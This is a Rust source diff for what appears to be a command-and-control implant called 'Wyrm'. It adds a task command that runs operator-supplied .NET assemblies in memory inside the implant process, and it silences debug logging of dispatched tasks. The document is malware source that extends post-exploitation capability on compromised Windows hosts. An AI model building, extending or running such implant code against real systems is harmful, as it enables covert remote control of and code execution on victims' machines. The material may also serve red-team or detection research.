@@ -31,6 +31,7 @@ use windows_sys::{
 use crate::{
     comms::comms_http_check_in,
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
+    execute::dotnet::execute_dotnet_current_process,
     native::{
         accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
@@ -173,12 +174,12 @@ impl Wyrm {
             // This is quite noisy in debug builds, enable only if needed
             #[cfg(debug_assertions)]
             {
-                use shared::pretty_print::print_info;
+                // use shared::pretty_print::print_info;
 
-                print_info(format!(
-                    "Dispatching task: {}, meta: {:?}, id: {}",
-                    task.command, task.metadata, task.id
-                ));
+                // print_info(format!(
+                //     "Dispatching task: {}, meta: {:?}, id: {}",
+                //     task.command, task.metadata, task.id
+                // ));
             }
 
             match task.command {
@@ -318,6 +319,12 @@ impl Wyrm {
                     let result = reg_del(&task.metadata);
                     self.push_completed_task(&task, result);
                 }
+                Command::DotEx => {
+                    let result = Some(execute_dotnet_current_process(&task.metadata));
+                    self.push_completed_task(&task, result);
+                }
+                // This should never be received as a task
+                Command::ConsoleMessages => (),
             }
         }
     }
